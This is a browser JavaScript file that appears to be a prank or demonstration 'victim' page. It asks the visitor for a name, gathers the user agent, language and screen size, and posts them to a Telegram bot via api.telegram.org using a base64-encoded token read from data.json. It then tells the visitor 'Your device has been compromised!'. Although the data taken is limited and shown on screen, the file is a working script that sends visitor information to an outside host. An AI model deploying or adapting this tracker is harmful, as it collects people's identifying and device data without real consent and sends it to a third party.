function showMsg(message, title) {
    const logElement = document.getElementById("log");

    logElement.textContent += `[+] ${message}\n`;
    logElement.scrollTop = logElement.scrollHeight;

    if (title) {
        document.getElementById("log-title").textContent = title;
    }
}


async function fetchData(path) {
    try {
        const res = await fetch(path);
        const data = res.json();
        return data
    }catch (error) {
        showMsg(error);
    }
}


async function sendTelegram(message) {
    const data = await fetchData("./data.json");

    const botToken = atob(data.TOKEN);
    const chatID = data.CHAT_ID;
    
    if (!botToken || !chatID) {
        showMsg("Error: Required data are missing...", "An error occured!");
        return
    }
    
    showMsg("Sending information...");

    const apiURL = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
        const response = await fetch(apiURL, {
            method: "POST",
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatID,
                text: message,
                parse_mode: "HTML"
            })
        });
        
        if (response.status == 200) {
            showMsg("Information sent successfully!");
            return 200
        } else {
            showMsg("Information wasn't sent!");
            return 900
        }
    } catch (error) {
        showMsg(error);
    }
}


async function load() {
    showMsg("Stage 1", "💭 Please wait...");
    showMsg("Getting ready...\n");

    // Getting victimName (Required)
    let victimName = localStorage.getItem("victimName");
    if (!victimName) {
        victimName = prompt("Please type your name here 👇: 😝");
        if (!victimName) {
            alert("😕 Name wasn't given, please try again!");
            window.location.reload();
            return
        }

        localStorage.setItem("victimName", victimName);
    }

    showMsg("Your name: " + victimName + "\n");
    showMsg("Stage 2");
    showMsg("Gathering information...\n");

    let message = `<b>Name:</b> <code>${victimName}</code>\n`;
    const deviceInfo = {
        userAgent: navigator.userAgent,
        language: navigator.language,

        screenWidth: screen.width,
        screenHeight: screen.height
    }

    for (const info in deviceInfo) {
        message += `<b>${info}:</b> <code>${deviceInfo[info]}</code>\n`;
        showMsg(`${info}: ${deviceInfo[info]}`);
    }

    showMsg("Variables set!\n");
    showMsg("Stage 3");
    showMsg("Sending information...\n");

    const response = await sendTelegram(message);
    if (response == 200) {
        showMsg("Your device has been compromised! 😝", "Your device has been compromised! 😝");
    } else if (response == 900) {
        showMsg("You got lucky buddy! You can try again... (reload the page)", "You got lucky buddy!");
    }
}
